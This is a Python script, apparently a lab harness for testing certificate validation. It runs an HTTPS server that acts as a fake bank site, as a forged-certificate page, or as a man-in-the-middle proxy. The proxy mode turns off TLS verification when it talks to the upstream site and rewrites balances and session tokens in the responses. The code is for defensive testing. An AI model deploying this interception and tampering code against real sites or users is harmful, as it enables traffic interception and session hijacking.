#!/usr/bin/env -S uv run --quiet --script
# /// script
# requires-python = ">=3.12"
# dependencies = []
# ///
"""serve.py —— 最小 HTTPS 服务，扮演"真实网站"或"中间人"。

    serve.py --port 8443 --cert chain.pem --key key.pem --mode honest
    serve.py --port 8443 --cert chain.pem --key key.pem --mode mitm --upstream https://10.100.0.10:8443/site.decert.test

mode=honest   真实站点：返回带余额和令牌的页面
mode=mitm     中间人：用自己的（伪造）证书露面，转发到真站点，并**改写响应**
mode=forged   直接返回一个伪造页面（用于检查客户端是否接受伪造证书）
"""
import argparse
import socket
import ssl
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# 真实站点的内容。中间人会把余额和令牌改掉，用来证明"能看到 + 能改"。
REAL_BALANCE = "$0.00"
REAL_TOKEN = "sess_7f3a9c8e2b1d"
EVIL_BALANCE = "$100.00"
EVIL_TOKEN = "sess_ATTACKER_CONTROLLED"
FORGED = "<html><body><h1>FORGED-BY-ATTACKER</h1></body></html>"


def real_page() -> str:
    return (
        "<html><body><h1>EMU-LAB Bank</h1>"
        f"<p>余额：{REAL_BALANCE}</p><p>会话：{REAL_TOKEN}</p>"
        "<form method='post'><input name='password'></form></body></html>"
    )


def _read_all(s) -> bytes:
    data = b""
    while chunk := s.recv(65536):
        data += chunk
    return data


def fetch(upstream: str, host: str) -> str:
    """转发到真实站点：upstream 形如 https://<ip>:8443/<站点名>，TLS 用站点名。"""
    netloc, _, sni = upstream.split("://")[1].partition("/")
    host = sni or host
    if ":" in netloc:
        hostport, _, port = netloc.partition(":")
    else:
        hostport, port = netloc, "443"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((hostport, int(port)), timeout=10) as raw, \
            ctx.wrap_socket(raw, server_hostname=host) as s:
        s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        data = _read_all(s)
    return data.split(b"\r\n\r\n", 1)[1].decode("utf-8", "replace")


def tamper(body: str) -> str:
    """中间人对响应的改写：把余额改成 0、把会话令牌换成自己的。"""
    return body.replace(REAL_BALANCE, EVIL_BALANCE).replace(REAL_TOKEN, EVIL_TOKEN)


def handler(mode: str, upstream: str):
    class H(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            try:
                if mode == "forged":
                    body, code = FORGED, 200
                elif mode == "mitm":
                    body, code = tamper(fetch(upstream, self.headers.get("Host", "").split(":")[0])), 200
                else:
                    body, code = real_page(), 200
            except Exception as exc:  # noqa: BLE001
                body, code = f"upstream error: {exc}", 502
            raw = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        def do_POST(self):
            # 记录客户端发上来的密码，证明中间人看得到明文
            self.rfile.read(int(self.headers.get("Content-Length") or 0))
            sys.stderr.write(f"[{mode}] POST seen\n")
            self.do_GET()

        def log_message(self, fmt, *a):
            sys.stderr.write(f"[{mode}] {fmt % a}\n")

    return H


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--mode", default="honest", choices=["honest", "mitm", "forged"])
    ap.add_argument("--upstream", default="")
    a = ap.parse_args()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(a.cert, a.key)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    httpd = ThreadingHTTPServer(("0.0.0.0", a.port), handler(a.mode, a.upstream))
    httpd.daemon_threads = True
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print(f"[{a.mode}] https://0.0.0.0:{a.port}", flush=True)
    httpd.serve_forever()


if __name__ == "__main__":
    main()
